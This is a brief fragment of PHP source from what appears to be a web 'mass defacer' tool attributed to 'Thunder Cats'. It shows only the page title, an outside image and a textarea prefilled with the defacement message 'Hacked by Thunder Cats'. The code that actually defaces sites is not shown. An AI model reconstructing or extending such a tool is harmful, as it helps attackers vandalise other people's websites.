...
echo "<title>Folder Mass Defacer by Thunder Cats</title>";
...
echo "<img src='http://www.bbmgif.com/images/leono_thundercat.gif'>
...
echo "<font color='black'>Script Deface</font><br><textarea cols='25' rows='8' style='color:lime;background-color:#000000;background-image:url(http://ac-team.ml/bg.jpg);' name='index'>Hacked by Thunder Cats</textarea><br>";
